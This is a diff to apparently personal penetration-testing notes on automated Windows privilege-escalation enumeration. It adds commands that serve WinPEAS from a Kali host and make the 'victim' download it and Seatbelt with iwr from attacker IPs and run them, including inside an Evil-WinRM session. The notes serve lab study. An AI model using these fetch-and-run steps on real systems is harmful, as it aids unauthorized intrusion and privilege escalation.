@@ -1,13 +1,41 @@
-# Tools of the trade
+# Automated Enumeration
 
 ## WinPEAS
 
+{% code title="On the kali" overflow="wrap" lineNumbers="true" %}
+```
+sudo apt install peass
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+```
+{% endcode %}
+
+{% code title="On the victim" overflow="wrap" lineNumbers="true" %}
+```
+PS:> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> .\winPEASx64.exe > outputfile.exe
 
 ```
+{% endcode %}
 
 {% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}
+
+## Seatbelt
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS:> iwr -uri http://192.168.45.189/Seatbelt.exe -Outfile Seatbelt.exe
+./Seatbelt -group=all
+```
+{% endcode %}
+
+## JAWS
 
 ## PowerUp
 
